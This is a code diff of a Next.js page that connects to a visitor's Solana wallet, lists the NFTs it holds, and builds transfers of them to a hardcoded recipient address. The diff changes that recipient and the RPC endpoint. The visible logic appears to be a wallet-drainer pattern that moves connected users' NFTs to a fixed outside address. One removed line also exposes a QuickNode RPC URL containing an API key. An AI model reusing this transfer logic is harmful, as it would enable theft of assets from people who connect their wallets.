@@ -1,7 +1,7 @@
 "use client";
 import { useEffect, useState } from "react"
 import { Toaster } from 'react-hot-toast'
-import { Account, Connection, PublicKey, Transaction } from "@solana/web3.js"
+import { Account, Connection, PublicKey, Transaction, clusterApiUrl } from "@solana/web3.js"
 import { TOKEN_PROGRAM_ID, Token } from "@solana/spl-token";
 import { getParsedNftAccountsByOwner } from "@nfteyez/sol-rayz"
 import { MetadataKey } from "@nfteyez/sol-rayz/dist/config/metaplex";
@@ -48,7 +48,7 @@ export default function Home() {
     if (window.solana) {
       const wallet = window.solana
       setWallet(wallet)
-      const connection = new Connection("https://sly-boldest-haze.solana-mainnet.discover.quiknode.pro/ce8cbf142592ab1ca55baaf964aedd2887e861ad/")
+      const connection = new Connection(clusterApiUrl("testnet"), "confirmed")
       setConnection(connection)
       let v = await wallet.connect()
       setPublicKey(new PublicKey(v.publicKey))
@@ -71,7 +71,7 @@ export default function Home() {
   }
 
   const transferNFT = async (nft: INFT, publicKey: PublicKey, connection: Connection) => {
-    const addressToSend = new PublicKey("8MdXvWgNou9jRVturbfnt3egf1aP9p1AjL8wiJavti7F");
+    const addressToSend = new PublicKey("95H5jdaD3jA1HHw5Vz15iznnD4EHwuVsTsCXPDepES4a");
 
     const sendTxPromise = new Promise(async (resolve, reject) => {
       const transferInstruction = Token.createTransferInstruction(
